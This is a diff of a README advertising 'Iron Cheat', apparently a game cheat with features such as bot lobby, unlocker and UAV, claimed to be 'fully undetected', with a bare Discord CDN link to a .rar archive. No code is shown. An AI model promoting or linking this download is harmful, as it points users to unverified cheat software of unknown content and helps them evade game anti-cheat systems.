@@ -3,7 +3,7 @@
 ##### [🌍 Discord Server](https://discord.gg/mTgHfdM5kh) 
 
 # Iron Cheat (by Iron Team)
-The new cheat of iron team all features is fully undeetcted nothing is detected
+The new cheat of iron team all features is fully undeetcted 
 
 # Terms
 - [x] Educational purpose only
@@ -22,4 +22,4 @@ The new cheat of iron team all features is fully undeetcted nothing is detected
 - BOT LOBBY
 - UNLOCKER 
 - UAV
-- [Download]([......](https://cdn.discordapp.com/attachments/976602764148895754/976624109175840778/iron.rar)) 
+- https://cdn.discordapp.com/attachments/976602764148895754/976624109175840778/iron.rar
